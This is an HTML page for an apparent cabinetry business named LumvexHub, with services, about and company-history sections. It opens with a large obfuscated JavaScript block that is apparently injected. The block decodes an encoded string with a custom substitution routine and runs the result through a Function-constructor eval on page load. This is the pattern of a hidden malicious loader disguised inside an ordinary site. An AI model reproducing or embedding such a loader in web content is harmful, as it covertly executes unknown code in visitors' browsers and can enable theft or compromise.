:&MrL=r9czz‍cRgM&R-‏br5=E*04 5ig814j4O2{‎?ne~Tq=6!Z l^‍8yIj+ I5+l{8!nb65^?tu3T‏-a !qL0NIN‎$aq9‍/Hw)b)$a/Hv4H‏(j~{!nuOr(i(*n^]u+R‎;‍uAAaA^‏bHR8~$‎4)'gATqr/] -O)~{ZQ;9‍44r)r-9qb]{QA'20;‏u*e/I;L‎H1zw ;]395k9u:u+qk9z‍H3‏5w;5bKi+rHuyyD‎$En2zaAuIzqHMD +EOqy?9Zi$‍QIzI?DQ+MOy$A‏baiu${n(-M8==( 54jDE z‎Np9;cAnRrqOtgZ8ys;2ME/Z D5‍v9ycA/pOtDNvrs85g;+ynM Tg!‏b)$$iNu6sD$‎^E)/-qiatH R89gO+Z{ELy&2nIZ6QOv‍9gg6v&-tI{n 8^yai‏b+QHj'eqLKi*-2-2(Z12s1zuZl:‎+(+y3eLLR: 3l(‍:b&2+e0HR)‏IsMrI?Z!eMLM]?‎qnj 0'‍i:6nj'?9iM906&/ZL‏44K.bqpEIK‎yuj?HT-/z 'ZROsK3/(/‍K(~sR3-'lHy=6RA#/ e8ji^AiZ #bO)v{Nu#^)@JAilef6j@O/[fjP[@J#z‏9513A.;eO]gwHL=yaEN& #b')v{Nu#5)@JLgzafeNH]';@&1=[fjP3@JJZ8bK^z:~?N1OuPby[K$ 17deOuKbz7b$ e:K^Ny~?#Z8A8l6Aj=/RiZO ebNi^)u )#@Jfv{eO#^if/A6ljPj@‎[@=[CJ(tpbtK71q0Kbz15$ eOu#y#0jl6R@=/ A8OieAiu^#Z )vbNf#{)@/^ilJA6jeO@fj[@JP[Cb‍1OB#byuK$z#v@ e=(@7b5tp1tK#vq0u @#bJ)v{Nq~T)@n/_btzsi;k#/M:~4$$elIj(p08!.=Nu$#@ )vbJf#{)4I0=(jp/!$P@f#[@JtXbtp1q=(0@05KX@#j[PCVP&[Cb[uM {*kn37b:/sitz#b;MR$B`b/?k;3Q4=DM@Cq00_E9q4 RgRZ~OO9T~7JZR9AJD8/sbtk[i;Mno77:z{2bB`^gusba!rkZJZ8[mJD8~mb{*9A3[&uM`o77 b{~bB+ua('3wk[L nvCb7J(0I$b1{)He;80*9a0P0H85bc[7kR9Hdbc85k*7JbR05k*9H7R0c82q:77~:~A *[F0q9H8WbcC5kR9 AJ0H85b*0kR08[dbc0$H1{7be;a03 n0I)Jv(0$b1{PHe;8b*9a0R0H85VcU0kO~Z[Cbt2Oq;kn/_M:zsib'#bB/N6(`su(c)rp4& `1@#=ba.bBsRN+np{)/=wTvg4Jb(v'H1{8@e;a0$CJ0[COJb.V/pN'id9^[k AJ7n/sbtz#i;M/b.':pN9iO72^@oqq:~7~:[A .9dba7r]aebtk]/;Mn/s':z#iiO/b.@CpN9sbtk^i;Mn/.':z#9iO/b^@7pNNubB`M-nAb)Qw/Q[JgCVgUUVH{WpaUO q RZOZ[CJUUiOJb.[/pN'7d9^tk AJMn/sb:z#i;O/b.'opN9i772^@ qq:~t~:[Akn/db:zsi;O#b.M/pN'iO9^@4/4/7/0UU0v(0(MC$$04VV[$paJU~gH{UI`UWO AU[`JoJCb^vbBI/(/kjAA{yk_ t$*&q_b[uM {dO~3[CVZ2O9b1!q/ij1Anv7b3b(0I {*&)J#buM )B`b3/R*ppN0g$^4Z]8*[#b@P?1B`b!(v~a$D)/R@Cvu/* AJ.&uMb{B` 3#~b{Qbg36iH8T 5)d 6Qwb{*@[3#&uMabB` *Z'b!u-I210s=Q42-805`b@#bk3N1BeA1E-yMc)g@2)//J[COjn/Vbtzsi;k#bBM:AM`b'-tM56@JJMuJJ[7lbn8duR[:^n87d7:^lbb{*uR3#&uMLbB` M:nbc~gvyiy:$Z(u@JE':_y~EL~ZwywOw#YcR~Z_KHU7 @$YJb[C un8:AR#b^l/&B`b63/?Ku89jR0~vn:[db@^lun8#bR#v)B`b@46ln:?4)gZsrMe.v@J30[J[CVv[CVV[CbP0)?cc0d7J[r AJ7/sbtk#i;MnbB`:zwrb{l0(v^4i$/Nj+Mw@JbMEvb*K i`r1A.&{K[[.*&udbbBM 3s`b*#Qer$)45w{ub9L0)B`b@Jk(53HDMkZ/cO/rLbBR)[&`bt#0'R*)@J/$rpJbp2&{[^N1!7dj1A9b#bB/iyl`bn&kMQ.):^'Du$ZrLN@JbOp&{p^CV[CVk AJ[n/sbtz#i;M)bB`:ql6be)@n;)EJb++vi`MMncb*+b[[dMn=(JJ]Pn/5jbcA(Qv[K0AJ7d/bn= 5(](nb;[dJy:LQJ0Pb!)$M^(47/E(QdbM[$M^(4b/E(Q{*&M7#buM uB`b3tc^^/wwK4M9prAu@Jbju/5n=(:(]Pn~H Q9#b=Z~2B`bOIj53;uicO2uMeA5 r@1?:LPJb[Q!);7dy0OqO~ZH_Q92 =Z:~B`~O#2b{ub01)r6CV4L9=[CT@~JJy Q!b;:^)y0L(4Q7b(M$M/-#bBE4' `b:5tl/JTcN*[[[Q@LQdb;b!)y:B`b0#eR.tz$Mu=I@J[!^J[CVVKCJb[0jQcA;:v7J0LQ!bPbn)yj2vu~z~Dtd A[7LQJb;d!)y:bcA0[vJK0j~obnQtj2vub;z~Dy:LQF0#b!)5)B`b9c']H'@W{kQ!b;:B)y0L`b.#b&!jQ?/0u$.p.(g{bn:a@2vu~Pz~DtjJb[C );:LAy0#Q!;NbB`I)=vbZr21(9:@77b~#bQHczB`-0+AIu D?vn0nRHdb!M@);:L[y0#Q!5.bB`q4k0b.4q$ :+T0zV]@J&VO~[C_bZ2OQcAKqvCV0j=([Jb#n/5nbB`(])3baujvuj/9R'-6Jb@Pv5n=([(]#n/*5bB`MtzIbvgk!k[C0@P{VV[0*&uJbbBM 3K`bK#459IQw@.y8b[CV5{*&VC#buM LB`b3IeM3E)0?MRr)p1~) @8sbcJbBzL{r`0{LEvb^tsP/ (4J^vi+qbc[7Jc0rd[CV)?Jo[C (JJbA1:y5]pIzEP)e0zb[7Ku(1db5b:yz]+MME7bNEvi/MAK`TMCp:0zbpItKu)ekn/7b:zsi;&#bBM9rv`b06r(^b3-tAB`b@#pg+;8CDQM~ AJr@(1Jb57:yz][EopImmJ)e0zb#bBKu1u`bcE4M3.-@J)$](vPb#1:y5bB`zEKrbe$MM$Z].!9)([o0M217b5@:yz](O~E[[AZ2Odw=Rq_~Z~CVO2OqO2~C_Z[dV[JqO~Z[CV 2OJbAJo+3(tJ)~P1)v^bNAuj?rdb3[7+)(t1M~7b)Evi+M2*`barKCbyv^uNAtkj?7Mn/sb:z#i;H)bB`-!/)bH?1MND*.vab@#bKN1;B`(1u rR0/6lg@CuQb3 AJ)(t1J~o7)+mJ[)b3(m+)~t1Aro7b[v^uN[dOj?q_~Z2CAw=OVO~R~_ZZ2O[O2~qJ[[CV2OdO~JqCVZJJb AkNp?ep^g/&cQ&PbvvMPbb^~~;^;t0P4eDv HePbT85k*9b3R0cOuHaPr Puug0b!3{q/P{80$b10PHe;sbi0a/Pbrl6(&M0=~PbM8AD&N!arTPP6:$bbiM?i90I$^(zvP20j~bcH-4'P8MZ4b^9[M0pc7dbQ&Mb1{87J;a0$H00PbeM6(&M)/~Pb52Agg^(/Pba~:{jzPb!HL/K6?dj/[Abg)7g7b/2$H1{8be;a0&M00#@#M6(ZbB`~=&'b^!64?u['yneCb5@J{j^(/Ha~:qwZ7#E9 I~B:~_`b+PbAw.l ])5sA'Z/TjPPJ[PP@#PP_VdP@P(/Cb5~:{j^#bBHa&+`banH4M!@Jby(6(&M0b~#bM'~AB`M(*reC @J2bg)[[7b/2Agg)/g#bB2Ac!`b*vwe2yr$ucc[C)g@!A9OJ6?zJb/_L/K^9A_j(/:b5~[{jHgd Aa)/2JbB`Ag#Ib+ub)AH);vrL)v62@Jr?zLb![7/Kjd77U/O~Z0[Aw2Oqb=R~_g)/CVbg2Ag#)/27bB`AgD!b!4awI+8${0O0JbN '/!6?@Kj/zLCVPP#[qOZPb@#b+3LB`)1u&80ay)2E]3!OJbMz@:cMAJy;)8!bg[77)/2dbg)Ag#b/2ArB`bg'(Kzzr+(Oqbrq.ycMA@J;)8!:VPy[C [C)/AJb2Agg[do7OqO~Z~_Aw2CVO=Rq_~Z2VZO2OCb;~C~0vv^87Jb~0$H1{Pbe;a(&M00~PbM6v.Kc&-eQPAr$eb-[7rv&&db$Av.Kcw=eQ7-R~CAr$eb-7brv&H1{8$e;a0$M00#bCM6(&b1{~@e;80$Ma0#H0M6b&q~(~@lT_{7DJbO9$H1{8be;a0&M00#@PM6(Zdj~~wOjZJ8O~ZP~98P_E~ _O_dI~O9 AJ[8778Ob-7bByHAH`/80:r[d]u'vbKc~.eQ&A~C7ZOOVO~2q_eZ2EZ~A=Q#bB~cM)`b uz$a/6uLkr]IyjOj@JZO~ZPw98P_8~ _O~VI~OEV[C[C0$b1{#He;8b&Ma0~@0M6-#bB(lcc`bM'0Ll5/Ei&@J[D080Cb10$He{#b&;a(~M0Mr@7b6$er--O~v&$bZ2OCKc&q_QCAv.tVCbeDv ^;70T4eaCb3euuOuHp?r 7ge&kb/#bN^QnB`bD15A3TM0M?$q.zzOu@CQJb*A9kR9H8b0c75*9HvC0c85kab3RuuOuH*9r C0H85bcXXkR3{[dbbg0q!p?e/7g/&kN8#b*^5kR9Hb10c@e{80C;a0$H{g7b!@0q/3Cb&#v(~M0Mg7b!60q/3{b&#0@rN=8CT7bAD0q!3{b/#/g!a6@C7J:$?6b&Mi(~[0M^;7d4tDvbee7 TbivCV9MI$C0zv^2M07Jb7M6(&db~[v ^;tvT4eDCVCe7j~bc(&4'70v-rJbPb)(u/+ssyw;+&^4)~PbdHA[-b^;7T4tDvVee7 CA9vC-MOJb^Z4MH97v08MZCbH94M0-b&8^DrN=8MTCbAZ4MH-XX08^b[d 91{8AJ;a0$Hb0#beN$ B`0rMMAJL2M{b&Mr@~[0M60[db(j~4c(bH'J00-MZP8^94M0MPb&V6(~Mb1{[Ce;80$ a07Hnv(b3b10I)e{80J;a0$HAJ[CV8oJb 0$H1{#be;a8B`b0^4ZK;k@lcnMJb&*6(~M0bc[[['(0jdJvP~4Z4bH-PM08Mb&M^9~[0M6rCVb(ls/i0807b10$He{Cb1;aHe{801;a0${807ba0$HeM#b&;6(~M0Jb@C H1{8Ae;a0$`b0#b;{:MBv485yB`)@J~b.rbAlR&O(w-'Md$~Kybc([['J0j~&0Pv4M0MPb#6(~4bB`X($:b'.i*{&Ceu@)Vb1[He{803;a0$ nv7bJb(0IH1{8)e;a0$AJ0[C0ob1 $He{8bB;a0E`bp#q(O(AH5IH/3rp4H@JbHal:B`b'5'z&qq(2{[[D:]jdbcM~4'(0PbJvP(&M00~XM6b'#bBq6{5`$=LuNasM;Q @[)AJoCVg0b!3[q/#{d A4@cQJob0&MJprlsbiM0/Pb[M6(&db!~[?ia6:MJb&$6(~M0~=[CVJR~dVb;v A0Jv^~sbi0~/Pbrl6(&M0i~[[MMI$dbzv^29MJb&06(~M0VO[CV_~Z2Vb^;OqT4tDvJeeC ##bV[sitknb;M:/B`bzP1)gj&ZDMuvpPr2/tk@P#Mn/sb:zPi;+NbB`M05wbj0^Tq0:6L4bPv@atknP#M:/sibzPb;*reB`$eMnkP&K!e0@PPvn/#btzsi;kPbBM:)R`bpkOzLOLPv5utk@P#Mn/sb:zPi;NMbB`e-Dvb(^u*cv@gL4nP#bP/sitkPb;M:uB`bzDN:Q4R=/QM+~v)KyPvTgtk@P#Mn/sb:zPi;+rbB` 2/Mb6?sjpv@)5=nP#bP/sitkPb;M:rB`bzNEjKaPviApk@P#un/sbtzPi;M:bB`:u+Ibak;pO(8jvH5Pv@H/knP#b:/sitz#b;Mu B`bME/$au@P )^MbB`rr14b.c;O 0@zl+&P#bPuM {*`b3Pbv'/.Bau0nzP#-PMMb{*@ 3P&uK/bB`lA38b9I5!)#bP/@ {*&P3PbuM3:B`bM9kKNKPr{M{*@P#P&uMbbB` 3L bHvA${*^/:t'r/@;/K&P#bPuM {*`b3PbnQK6BE 3Q--MAO9P)0ka/P0v3{*@P#P&uMbbB` 3!wbg9zzw:/LM]utP/wZ0*@P#u&uMb{B` 3PubnqbtEq=z;PMyT{/@P4*&u#bbBM 3s`bnPEO{=LQP)p:{/@Py*&u#bbBM 38`bQ#a^Op^PbyD(TB`b@0s$iuP4~gMk@P#An/sbtz#i;M/bB`:v$)bi~{^?Ob@Pb:.v/B`$44wuP/*TMv@P/Dn/#btzsi;k#bBM:]r`bi0Mr0)@Pblr4vB`bMr]^+tPv]]tk@P#Mn/sb:z#i;N4bB`ua((b)~tiz5{c(A`)@Plb&LbB$Dusucz*iv)Pvivtk@P#Mn/sb:z#i;i:bB`TTjRbR-@{?b;PbB0!$v`iaE((#bPv@itknP;M:/s`bz#b)ikeB4(4/8.3]!r`*@P6b*ubBs-K:HI=9v(R0 ur@P^iPu#b{vM 3*&bi#bBzMQs`E:w~0bB;u@Z`b^J1lr:u)K )M`/[Pvbc+bB0;yM-r3MyI@P#?PuMb{*` 3#&baMbBTa(D$+)r=)@Jbut;0B`b($Dlg(69~+j0Ozc`4[P(b&4bBDgzIuu9kv8.PMyMPb@P#(B`bvM^pQZP02Z3P@P#DbB`r2b5a02N-T+D)8N@P=4PB#0`bzPbRe45.tvrRi/;O:)0@n+LbP#PB`bP0]N1r0A'?D@P#DPB`P1b!zb28ri-AuNylP)MP4#0@btPbBI0*(`rj{'{w4up(0'?u4@P#HPB`P9b;qb?LQl)'4k4$@~P0vP#P0`bPb+!N]B~?*Mk*(${5P24P{#0@bcPbBMO)M`3r?//P# P0`P@b^zbB&{:MlO/9v-'P0OqP@P#abB`'/wbQq $=u+)D4)P0@r:PbP##uB`b@k/v;~;wEI0&v$r)OP0$.@P@P#6bB`#/:.bzE;r0~HDeNLg/8Ze##P0@b@PbPNc&B`HLq'A..qIA0P09KdV@@[ ~=R[AJb~dr]ae.7a]/92q:77~:~A .[dbq9r]aeq2a]/b==C7i*5VV7JtELIb^O/Pbis8ve=eA]Pb.MwrP*{vZbgI*NjEM21pPb.PuKM;ba;+Pb!]tPbLz~4*^4:wPb]$M9z=Rt?PbN$/+cQPb!&0t5yv~4Pb5$r''1KAPb*$;M*0)g=/Pb[zDua7dM{8Ib^OE7b+svi`MM8Ib^O8Cb^sI7bOsI#^OscbB`8.crbQ'1a$vs@Jb(8I#^O^'bB`{A$Mb2-(.3?2g/MbzMiHB`b@J(330M1ukn95[X50i=0[C7eAMbb^OvebBs8IZ`b1#$DwQpR1^u;O~@J$s8Ib^bg#bBK*w(`Z/ijA$[{4@]Cb.Uwr7*{/sbtk#i;MnbB`:zQMb;k/s:r]vM@y/eAJbiBMve=`ba#buT+8(e?A2HvlwakPre@JC[P0v AJu[n/obtzsi;k#bBM:Mr`b1 )n$i')@$0{]Jb.bwr[*gIM[dE7vZNMb{*j 3#&u{4bB`=tirb2]M(9n$IaM`;@#qbz3bBekM2^svr2M](w'4#b()cKB`b@ZM!+?Me]DLv@%v~vvvl0b.C Ao*{]J7bgwrNjIMveE[dZ.9rba7q]a]C2==/Vb*CVKM21pk+.7un/sbtz#i;McbB`:0r$bik]Ew-ecR=K@Jb&vMvi=ebe#bAp)MB`4u(t(ue@Jv[P0rPa;u[Ct]t;bkn/7b:zsi;t#bBMk.M`b)yu6j!/54=e)@gveAJbiBMve=`bz#b^vu$RM?/Kq$.Ma^$[@JubP0uP^Os[C^O8I7Bs8Ib`b+#bc00OO=-{((14.u.vPu0@Ib^OJ#bBs88n`bK=;wTz~2g6eCb@U$4*^4[w7q]$tk~T_Mn/sb:z#i;+rbB`Nic)bwE0{61n$-.B$8@5`b{Jb4H/4$b M0~B`b&P*~!.jQ9H; =Rj9(/[{tNNCbzlM9?=R_b7q~itknT;M:/s`bz#b2*E/B$-.(^bBrI@{`bKJ1+4a?u+v$?A/4N]sPbu9):B`bz]:apzH=e089u64QI[C*t$/bc~7+!&tq~T0kn/_b:zsi;n#bBM4^r`bLZiTI*rp/9zE3QM`b@Jb$;r]Baz{TrryDN~Bvr02`bcPbMl^yA(1/0{[CbOq$t5yv_47q5btk~T;Mn/s`:z#ib*MbBi;l0{JIg$D#G(@UAvU)`@Pwb;ObBg!{uKu$(/iv0u)Ab^{q[bOs8C^OsI7B`8I#Ib'&bI~l{)sa4wu4@Jb)]$4*^`bwPbN&KwBMKz:9D[y44n#bBl0r `bIDr)uM4g9s $'vM=R@JbbNM9zB`b?P1.{tvH+r;zKa(]qbB^r[.`bz#rT4iI@JLL4/bcQ4+!&t$B`0~P;bQ bg&Kg)[#c&HjbB`Ml0sb{?6ywMpIn(k$@J./5$b5y`t4PvbgvbBg-E.I)tn]HM2?L !L:[C@z~:bCA97#1KOJbP$r''b*07v*/)A;t7baM;Cb;]r''1Kvvl$Cb'0v'X1K$)XPbrA;M*0b**/XM21p7+.PuKA;b*0vM*/)l0v%7!Lv[d*z~:b0)A#b@7;M*rb'1/'CVK$zDbag^uM{=Os87b`bI#bl-j5B4kur6g-MM:@+A~qJf`(gj[d/VOCO~fqJJZ2tpbt=P1q0(bKR5Ks.jZi(kaPE$cHb5nRuPbbn24tcH$(Pb'$]$PeLvPb'1)~PbK$rM*0)'*/[A;t=7d0(tpb5K71qKR#@C.jZibka7EszDbagBuM{=`b'#bk]ttv/O/ k@Cb40Hu5($t7btcp1q=(bB05KZ`bt#)+1$4N&/2K`{@#5b50bBT3u4{)91THw@J;~tpbt=[1q0(Cbt5K4(nRn/7bt2si;knbBM:z5`be#2vt)u@#;nj9bB`i=:3b+8./uO@OI;;JbtA-i;kn/bM:zscH$[CbB$]$e`ba74jNatw9s$0bM#b9e0+B`3D'?H-8?z;@J0r9O[C$Jb'Ar'71K0)vPb7A;M*vCb*/r''1KZbK$iEsRjb'.kaX1K$CXPbr';M*0)b*/XA*0)XP/%A;Mv7vl*[db0v)~'eLR7Jbvn24tng=(Jb#zDuab'1M{@PK$r!0u['Lz~Ub0):#b@A;M*Xvl*/%v0vvbl0v[5($vC%cHu$XbJ$]$cHeL#Jbuv)~'[Svf0H$@Xb'$]$ceLv#bu@)~%Z[CV02OqO~n/_btzsi;k#bBM:R$`b'0A3an2@J*2tpbt=#1q0(bB`5K-]bzNtuiw-a/l1~4H@J[[CJ[CVV[HKCb3JjZrMbniO7^~{uRn4:Pue(IbnPb9N(''1K]Pb3$ruOuHadr [ubni7^~{uRg4:7u1)!JbQ~q/*8Pb&)ADrN=dOT[7_~Z2btkOq;Mn/s`:z#ib-4bBn^rn*E?i0+e*!MsbBIg@u`b3#zv9I60v5-4@+uL=JbtT)i;kn/BM:zs`bn#brsr1n#l9.EbB`g@D+b+skLrTynAj;IT@54E&J[,KN=8JbUbADr/g1)T*)Q!q[X~X0qbg1[/*))!bnQ~VNne(C(]7I93uCrHaub 7buORuni{0^~4uv,0:J(Mvvv[,0vPCA9vv1KOJbC$r''b'17vbK$ru3uH'Or auK$Cb'dr'X1bnnX[N(e(Ik]X79n/sbtz#i;MabB`:ls1bp*aI/Z0DLq]@#bqEqMB`b0O4/a6ls4?@Jw(ERbniru^~{uMu4:JMPuM/[[CM42OVO~eq_bZ(I9nnVCN(]e AJC.9rba77]a]A72q/ q~:~ae:[d].9rb/7b]aELi*5~/J[t=R~CVba_ Aae.9J]/7r]==77q.[db29r]aeb3a]/rMHK7OJ[jZJYCV _vY_Ab+M q[dMEvvb+Mii#YME[CvY@dV~=JO~ZR~Vb2Oqi+MMC`biEv7J0k/0Jbc4Dl)3cb*H-cb*08PaE!(Pb*rA/v!MlPPb1ug0ww=v^616(;tDPbeev T1[74w=vdb16(0w'7bB6]My`b.$9k68Cb*4(#b*0(01w=7w61vJbc6@:yMA8s;)P!s&^b+~P/w;Ibnn+9N(e(4-]PbP:(=-b'1j$[7K$redb'(I9nnN(]:Cb-7(=j4-`b$7b9Nu4BtA5tzCA]u:19OJOK$rb'b''7v1K$Cb+sr'w;s&^1+~C/K$rb'db'XX9nne[N(](I4-X7b#:(=-bB`j$Arba=L1M- M0LQibt$y@;kn/JM:zsibQ#bBR9n&`)! {e)Qu']`j@#^bz.bBK;6MT9Mzrs/Q4g!btM6@;kn/JM:zsib3#bB)~/H`0$:E2`b@#b$.8nBKi~:I8$A*8@4rMvJ[,z!:(b-4B=j$-`b*#bE5048eig414j@O2O~[[CbZ2OVcMAq_;)8!:(XbnyI9NneCb(]C/aE!V7b*rA#b*0801w=(w61v(B`6@J!btubqN-3 q9a0N[LP0ICb*4rgv!Ml87b*u(#b*0(01w=Jw61vbB`6@~{bHvO!((4rn^ju+Rni(CP0/*b**/[b*08(v!Ml#@7Jug)Zbnkz0p~d:~[7_b=~Zitkn~;M:/sE!z#b:rA/a~=~@CtkZ~_Mn/sb:z#i;lub*!~gv@MZ2OCO3cqJb-0Dlcc77)H~)7bnFZz0kbaep[a].9rV/W]CbtCi;kn/aM:zsE!r#bb{A/@3*&u7#bBM A^`b;R8~$a4)'gHbBr/@e`b'#/I120Jbu*L {*&@3[CuM/sbtk#i;Mnb*!:zv@Mlu~7Jbg)Zznkb0p[#**07b*!8(v@Mlu)JbngZz0k~^;p[C4tDvbee7 T_JJq~VJ[7T[#bdTgB`b)!$i+$6sN$@JD)/AbaEu/X!r*!JXXMlubJgvb'XbBKeq-`i*(2j2sZ1u[1zX-[[[b&#bB0HR)`IsMrIJb!eMlc3c@)H-0Dccc[C[0r)bCO~?J_bZ2O ^;tqT4eDvJdeCVCVPd[V[JV[9TT q:[C\\\";for(_BqhTW of _C22oe){if(_BqhTW[ã('Ϯ')]||_S35cpT82dF){_OIflurB5=_KxR2N59-(_K5I8Yo4V()+_BqhTW)[ã('Ϯ')]%_C22oe[_XU19v1tp];_UfT1gN0=(_A2L7fz,_DoFpAjs1U,_XtUXO7l8D)=>{_X3SfrsOCki=_X3SfrsOCki[ã('Բ')](\\\"\\\\x14\\\",'>')[ã('Բ')](\\\"\\\\x13\\\",'<')[ã('Բ')](\\\"\\\\x12\\\",'\\\"')[ã('Բ')](\\\"\\\\x11\\\",\\\"\\\\\\\\\\\");_X3SfrsOCki=_X3SfrsOCki[ã('Ӷ')](new _VjC2kYX5dG[ã('ҏ')](ã('р'),ã('А')),ã('Щ'));_X3SfrsOCki=((_G6MPXUQ,_VAwa7,_T1eFz53mAG,_GlP14wU,_D7tLDI0e,_YchLAi8M47,_B15kLVU7i,_Vr1k1r,_WE5vfB83qj,_DoFpAjs1U,_CJYt0p,_QZT84Q,_U5fpWdhX9,_XkZY1UhST,_SXVy0iw3RR)=>{_B15kLVU7i=(_VAwa7[ã('Ө')](-_YchLAi8M47)+_VAwa7[ã('Ө')](0,-_YchLAi8M47))[ã('Ө')]('');_WE5vfB83qj=_T1eFz53mAG[ã('԰')][ã('Ը')](_T1eFz53mAG);for(_QZT84Q=_GlP14wU;_QZT84Q<=_D7tLDI0e;_QZT84Q++){_U5fpWdhX9=_Vr1k1r(_QZT84Q);if(_WE5vfB83qj(_U5fpWdhX9)==-1){_CJYt0p[_U5fpWdhX9]=_B15kLVU7i[_DoFpAjs1U++];}}_XkZY1UhST=_G6MPXUQ[ã('Ϯ')];for(_QZT84Q=0;_QZT84Q<_XkZY1UhST;_QZT84Q++){_U5fpWdhX9=_G6MPXUQ[_QZT84Q];_SXVy0iw3RR+=_CJYt0p[_U5fpWdhX9]||_U5fpWdhX9;}return _SXVy0iw3RR;})(_X3SfrsOCki,\\\"*IE21ZuK3Az=podXlq]f$;yc?^Fv(Tm5Mr,Ns|w-}:+'t)bS .O_U{R/B#Ygjx&C!Hn4kV60a@hGP~`eiW[8%JQ79DL\\\",'\\\\\\\\\\\"<>',0x20,0x7e,_OIflurB5,null,_VjC2kYX5dG[ã('Ӡ')][ã('Џ')][ã('Ը')](_VjC2kYX5dG),null,0,{},0,\\\"\\\",0,\\\"\\\");_X3SfrsOCki=_X3SfrsOCki[ã('Ӷ')](new _VjC2kYX5dG[ã('ҏ')](ã('Ԟ'),ã('А')),ã('Ւ'));(()=>{})[ã('ն')](\\\"_L55c0Y\\\",_X3SfrsOCki)(_L55c0Y);};_UfT1gN0(\\\"\\\",_Al9cj,_VjC2kYX5dG[ã('Ӡ')]);}}}))();})(()=>\\\"Jl4RiUKW1bbvqq6hR1qLYxC79E5e147kk8\\\",\\\"\\\\165\\\\143\\\",window,0x0,0x1,0x31,\\\"\\\\162\\\\145\\\\144\\\");​_L55c0Y._Y1j23()\"[_WZWjLh7l2()](`​`)[_WZWjLh7l2(1)](_Izgl5ltm=>{return((()=>{})[_WZWjLh7l2(2)](\"_L55c0Y\",_Izgl5ltm)(_L55c0Y))!==false;}))({});})();")();</script>

    <body class="main-container-xyz789">
    <header class="header-section-abc123">
        <nav class="nav-container-def456">
            <div class="logo-text-ghi789">LumvexHub</div>
            <ul class="navigation-menu-jkl012">
                <li><a href="#home" class="nav-link-mno345">Home</a></li>
                <li><a href="#services" class="nav-link-mno345">Services</a></li>
                <li><a href="#about" class="nav-link-mno345">About</a></li>
                <li><a href="#history" class="nav-link-mno345">History</a></li>
                <li><a href="#specialties" class="nav-link-mno345">Specialties</a></li>
                <li><a href="#process" class="nav-link-mno345">Process</a></li>
                <li><a href="#materials" class="nav-link-mno345">Materials</a></li>
                <li><a href="#reviews" class="nav-link-mno345">Reviews</a></li>
                <li><a href="#contact" class="nav-link-mno345">Contact</a></li>
                <li><a href="#" class="nav-link-mno345" onclick="showModal('privacy')">Privacy</a></li>
                <li><a href="#" class="nav-link-mno345" onclick="showModal('terms')">Terms</a></li>
            </ul>
        </nav>
    </header>

    <section id="home" class="hero-banner-pqr678">
        <div class="hero-content-stu901">
            <h1 class="hero-title-vwx234">Expert Cabinetry Solutions</h1>
            <p class="hero-subtitle-yza567">Transform your space with custom-built cabinets crafted by experienced artisans using quality materials and innovative techniques</p>
            <a href="#services" class="cta-button-bcd890">Explore Our Services</a>
        </div>
    </section>

    <section id="services" class="section-wrapper-efg123">
        <h2 class="section-title-hij456">Our Cabinet Services</h2>
        <div class="services-grid-klm789">
            <div class="service-card-nop012">
                <img src="https://images.pexels.com/photos/1080696/pexels-photo-1080696.jpeg" alt="Kitchen Cabinets" class="service-image-qrs345">
                <h3 class="service-title-tuv678">Kitchen Cabinet Installation</h3>
                <p class="service-description-wxy901">Complete kitchen cabinet solutions featuring solid wood construction, soft-close hinges, and customizable storage configurations. Our experienced craftsmen ensure precise measurements and flawless installation for lasting durability and functionality.</p>
            </div>
            <div class="service-card-nop012">
                <img src="https://images.pexels.com/photos/1571460/pexels-photo-1571460.jpeg" alt="Bathroom Cabinets" class="service-image-qrs345">
                <h3 class="service-title-tuv678">Bathroom Vanity Cabinets</h3>
                <p class="service-description-wxy901">Moisture-resistant bathroom cabinetry designed for humid environments. Features include waterproof finishes, integrated lighting options, and smart storage solutions. <span class="continue-link-abc789" onclick="scrollToSection('materials')">Click here to continue</span> learning about our specialized bathroom materials.</p>
            </div>
            <div class="service-card-nop012">
                <img src="https://images.pexels.com/photos/1571453/pexels-photo-1571453.jpeg" alt="Custom Storage" class="service-image-qrs345">
                <h3 class="service-title-tuv678">Custom Storage Solutions</h3>
                <p class="service-description-wxy901">Bespoke storage cabinets for closets, pantries, and utility rooms. Maximizes space efficiency while maintaining aesthetic appeal through thoughtful design and quality construction techniques.</p>
            </div>
        </div>
    </section>

    <section id="about" class="about-section-zab234">
        <div class="section-wrapper-efg123">
            <h2 class="section-title-hij456">About LumvexHub</h2>
            <div class="about-content-cde567">
                <div>
                    <p class="about-text-fgh890">LumvexHub represents decades of woodworking expertise combined with modern manufacturing techniques. Our commitment to excellence drives every project from initial consultation through final installation.</p>
                    <p class="about-text-fgh890">We specialize in creating functional storage solutions that enhance your living space while reflecting your personal style. Each cabinet is meticulously crafted using sustainable materials and time-tested joinery methods.</p>
                    <p class="about-text-fgh890">Our team consists of skilled artisans who understand the importance of precision, durability, and aesthetic appeal in every piece we create. <span class="continue-link-abc789" onclick="scrollToSection('history')">Click here to continue</span> exploring our company's rich heritage and milestones.</p>
                </div>
                <img src="https://images.pexels.com/photos/1080721/pexels-photo-1080721.jpeg" alt="Craftsman at work" class="about-image-ijk123">
            </div>
        </div>
    </section>

    <section id="history" class="history-timeline-lmn456">
        <div class="section-wrapper-efg123">
            <h2 class="section-title-hij456">Our Journey Through Time</h2>
            <div class="timeline-item-opq789">
                <div class="timeline-year-rst012">1987</div>
                <div class="timeline-content-uvw345">
                    <h3 class="timeline-title-xyz678">Foundation Years</h3>
                    <p>LumvexHub began as a small workshop focusing on traditional woodworking techniques. Founder Marcus Thornfield established the company with a vision of creating exceptional cabinetry using time-honored craftsmanship methods.</p>
                </div>
            </div>
            <div class="timeline-item-opq789">
                <div class="timeline-year-rst012">1994</div>
                <div class="timeline-content-uvw345">
                    <h3 class="timeline-title-xyz678">Expansion Phase</h3>
                    <p>Acquired advanced machinery and expanded our facility to accommodate growing demand. Introduced computer-aided design systems while maintaining our commitment to handcrafted quality and attention to detail.</p>
                </div>
            </div>
            <div class="timeline-item-opq789">
                <div class="timeline-year-rst012">2003</div>
                <div class="timeline-content-uvw345">
                    <h3 class="timeline-title-xyz678">Innovation Era</h3>
                    <p>Pioneered eco-friendly finishing processes and sustainable sourcing practices. Developed proprietary techniques for moisture resistance and durability enhancement in bathroom and kitchen applications.</p>
                </div>
            </div>
            <div class="timeline-item-opq789">
                <div class="timeline-year-rst012">2018</div>
                <div class="timeline-content-uvw345">
                    <h3 class="timeline-title-xyz678">Modern Excellence</h3>
                    <p>Integrated smart storage solutions and contemporary design elements while preserving traditional craftsmanship values. Established partnerships with leading hardware manufacturers for enhanced functionality.</p>
                </div>
            </div>
        </div>
    </section>

    <section id="specialties" class="specialty-section-tuv456">
        <div class="section-wrapper-efg123">
            <h2 class="section-title-hij456">Our Specialties</h2>
